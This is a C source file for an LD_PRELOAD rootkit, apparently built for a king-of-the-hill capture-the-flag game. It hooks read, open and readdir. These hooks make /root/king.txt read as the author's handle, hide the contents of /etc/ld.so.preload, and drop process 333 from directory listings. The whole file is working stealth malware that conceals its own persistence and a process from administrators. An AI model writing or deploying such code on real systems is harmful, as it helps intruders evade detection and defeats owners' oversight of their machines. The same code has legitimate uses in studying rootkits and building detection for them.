#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>

// AUTHOR: @profxadke (Nikhil Aryal)

// Original function pointers
static ssize_t (*orig_read)(int fd, void *buf, size_t count) = NULL;
static int (*orig_open)(const char *pathname, int flags, ...) = NULL;
static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;

// Target file and PID to hide
static const char *target_file = "/etc/ld.so.preload";
static const char *hidden_file = "/root/king.txt";
static int target_pid = 333;

// Variable to track if we're currently reading the hidden file
static int is_reading_hidden_file = 0;

// Intercept the read system call
ssize_t read(int fd, void *buf, size_t count) {
    if (!orig_read) {
        orig_read = dlsym(RTLD_NEXT, "read");
    }

    // Avoid recursive reads
    if (is_reading_hidden_file) {
        return orig_read(fd, buf, count);
    }

    // Obtain the file path from the file descriptor
    char path[256];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    char real_path[256];
    ssize_t len = readlink(path, real_path, sizeof(real_path) - 1);
    if (len != -1) {
        real_path[len] = '\0';

        // Check if it's the target file for modification
        if (strcmp(real_path, hidden_file) == 0) {
            is_reading_hidden_file = 1; // Set flag to avoid infinite loop
            const char *message = "profxadke\n";
            size_t msg_len = strlen(message);

            // Adjust count to message length if necessary
            if (count > msg_len) {
                count = msg_len;
            }

            // Copy the message to the buffer
            strncpy(buf, message, count);
            is_reading_hidden_file = 0; // Reset flag after reading
            return count; // Return the number of bytes written
        }

        // Hide the contents of /etc/ld.so.preload
        if (strcmp(real_path, target_file) == 0) {
            return 0; // Return zero bytes to hide the content
        }
    }

    return orig_read(fd, buf, count);
}

// Intercept the open system call
int open(const char *pathname, int flags, ...) {
    if (!orig_open) {
        orig_open = dlsym(RTLD_NEXT, "open");
    }

    // Hide the file descriptor for /etc/ld.so.preload
    if (strcmp(pathname, target_file) == 0) {
        errno = EACCES; // Return permission error to prevent opening the file
        return -1;
    }

    return orig_open(pathname, flags);
}

// Intercept readdir to hide specific processes
struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        // Hide processes with the specified PID
        if (entry->d_type == DT_DIR && atoi(entry->d_name) == target_pid) {
            continue; // Skip this entry
        }
        return entry; // Return non-hidden entries
    }
    return NULL;
}
